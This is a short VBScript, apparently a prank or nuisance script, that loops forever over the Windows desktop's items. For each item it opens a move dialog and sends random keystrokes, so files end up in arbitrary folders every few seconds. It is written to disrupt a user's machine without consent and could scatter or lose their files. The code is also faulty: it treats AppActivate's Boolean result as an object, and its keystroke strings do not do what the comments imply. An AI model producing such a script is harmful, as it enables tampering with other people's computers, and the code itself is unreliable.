Set shell = CreateObject("Shell.Application")
Set folder = shell.Namespace(16)
Set desktopItems = folder.Items

Do While True
    For Each item in desktopItems
        item.InvokeVerb("Move...")
        WScript.Sleep 500 'wait for the "Move Items" dialog to appear
        Set moveDialog = CreateObject("WScript.Shell").AppActivate("Move Items")
        Randomize
        moveDialog.SendKeys("{TAB}")
        moveDialog.SendKeys(Int(Rnd * 10) & "{RIGHT}")
        moveDialog.SendKeys(Int(Rnd * 10) & "{DOWN}")
        moveDialog.SendKeys("~")
        WScript.Sleep 1000 'wait for the "Move Items" dialog to close
    Next
    WScript.Sleep 5000 'wait for 5 seconds before moving items again
Loop
